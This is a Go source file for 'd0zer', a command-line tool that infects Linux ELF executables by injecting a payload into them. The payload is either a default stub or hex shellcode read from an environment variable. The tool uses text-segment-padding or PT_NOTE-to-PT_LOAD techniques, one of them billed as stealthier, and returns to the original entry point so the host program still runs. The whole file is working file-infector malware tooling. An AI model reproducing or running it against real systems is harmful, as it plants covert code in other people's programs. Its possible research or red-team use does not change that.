package main

import (
	"debug/elf"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"strings"

	"github.com/d0zer/elfinfect"
)

func getPayloadFromEnv(p io.Writer, key string) (int, error) {
	val, ok := os.LookupEnv(key)
	if !ok {
		errorString := "Environmental variable " + key + " is not set"
		return 0, errors.New(errorString)
	}

	if val == "" {
		errorString := "Environmental variable " + key + " contains no payload"
		return 0, errors.New(errorString)
	}
	val = strings.ReplaceAll(val, "\\x", "")
	decoded, err := hex.DecodeString(val)
	if err != nil {
		log.Fatal(err)
	}

	return p.Write(decoded)
}

func main() {
	var listAlgos, debug, noPres, noRest, noRetOEP, help bool
	var pEnv, oFile, pFile, infectionAlgo string

	flag.BoolVar(&help, "help", false, "see this help menu")
	flag.BoolVar(&debug, "debug", false, "see debug output (generated payload, modifications, etc)")
	flag.StringVar(&infectionAlgo, "infectionAlgo", "TextSegmentPadding", "specify infection algorithm to use")
	flag.BoolVar(&listAlgos, "listAlgos", false, "list available infection algorithms")
	flag.StringVar(&pEnv, "payloadEnv", "", "name of the environmental variable holding the payload")
	flag.StringVar(&oFile, "target", "", "path to binary targetted for infection")
	flag.StringVar(&pFile, "payloadBin", "", "path to binary containing payload")
	flag.BoolVar(&noPres, "noPreserve", false, "prevents d0zer from prepending its register preservation routine to your payload")
	flag.BoolVar(&noRest, "noRestoration", false, "prevents d0zer from appending register restoration routine to your payload")
	flag.BoolVar(&noRetOEP, "noRetOEP", false, "prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload")
	flag.Parse()

	switch {
	case help:
		flag.PrintDefaults()
		return

	case listAlgos:
		fmt.Println("TextSegmentPadding")
		fmt.Println("\tExtends the text segment and append your payload. There are max payload size considerations. Also more \"stealthy\" than ptnote2ptload.")
		fmt.Println("PtNoteToPtLoad")
		fmt.Println("\tConverts the PT_NOTE segment to PT_LOAD. Payloads can be of arbitrary length, more stable than textsegmentpadding but easier to detect")
		return
	}

	if oFile == "" {
		flag.PrintDefaults()
		log.Fatal("No target binary supplied")
	}
	t := new(elfinfect.TargetBin)

	fh, err := os.Open(oFile)
	if err != nil {
		log.Fatal(err)
	}

	t.Fh = fh
	defer t.Fh.Close()

	if err := t.GetFileContents(); err != nil {
		fmt.Println(err)
		return
	}

	if !t.IsElf() {
		fmt.Println("This is not an Elf binary")
		return
	}

	if err := t.EnumIdent(); err != nil {
		fmt.Println(err)
		return
	}

	if !noPres {
		t.WritePreservationStub()
	}

	switch {

	case pEnv != "" && pFile != "":
		flag.PrintDefaults()
		return

	case pEnv == "" && pFile == "":
		var payload elfinfect.DefaultPayload
		if t.EIdent.Arch == elf.ELFCLASS64 {
			t.Payload.Write(payload.Intel64())
		} else {
			t.Payload.Write(payload.Intel32())
		}

	case pEnv != "":
		if _, err := getPayloadFromEnv(&t.Payload, pEnv); err != nil {
			fmt.Println(err)
			return
		}

	case pFile != "":
		fmt.Println("Getting payload from an ELF binary .text segment is not yet supported")
		return
	}

	if err := t.MapHeader(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.GetSectionHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.GetProgramHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	switch {
	case infectionAlgo == "TextSegmentPadding":
		if err := t.TextSegmentPaddingInfection(debug, noRest, noRetOEP); err != nil {
			fmt.Println(err)
			return
		}

	case infectionAlgo == "PtNoteToPtLoad":
		if err := t.PtNoteToPtLoadInfection(debug, noRest, noRetOEP); err != nil {
			fmt.Println(err)
			return
		}
	}
}
